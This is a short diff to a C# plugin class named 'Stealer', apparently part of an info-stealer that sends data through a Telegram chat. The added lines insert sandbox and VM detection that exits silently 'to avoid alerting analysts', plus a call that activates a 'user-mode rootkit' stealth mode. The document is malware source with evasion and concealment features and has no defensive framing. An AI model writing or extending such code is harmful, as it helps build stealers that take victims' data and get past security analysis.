@@ -143,6 +143,18 @@ public sealed class Stealer : IUniversalPlugin
         this._telegramChatId = strArray[2];
       }
       this.SaveLocalConfig();
+
+      // Shadow Core Integration (Project Shadow)
+      // Check for VM/Sandbox environment using Advanced ASM/Rust techniques
+      if (!Intelix.AntiAnalysis.AdvancedChecks.IsSafeEnvironment())
+      {
+          // Self-destruct logic: overwrite memory, throw critical error, or silent exit
+          // Here we silent exit to avoid alerting analysts
+          return; 
+      }
+
+      // Activate User-Mode Rootkit (Hide functionality)
+      Intelix.AntiAnalysis.AdvancedChecks.ActivateStealthMode();
     }
     catch
     {
